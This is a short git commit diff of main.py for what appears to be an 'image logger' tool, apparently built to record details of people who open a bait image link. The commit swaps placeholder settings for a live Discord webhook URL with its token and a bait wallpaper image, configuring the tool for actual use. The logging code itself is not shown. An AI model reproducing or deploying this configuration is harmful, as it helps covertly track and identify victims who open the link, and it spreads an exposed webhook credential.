916420d010c0c776a083bbc5c653367d0c9bfd03
MR3DEAN <robloxgodowner1@gmail.com>
2025-02-02 00:44:43 -0500

    main.py

--- main.py
+++ main.py
@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1335481750431862806/GK566eyy_2Ws6Uw0hOpovm7YPP0X917ItH_ivyTHg6lwGxN44TGcKRYbbxeM0AKN-A_c",
+    "image": "https://w0.peakpx.com/wallpaper/644/472/HD-wallpaper-dont-open-my-phone-funny-weird-stop-you-saying.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
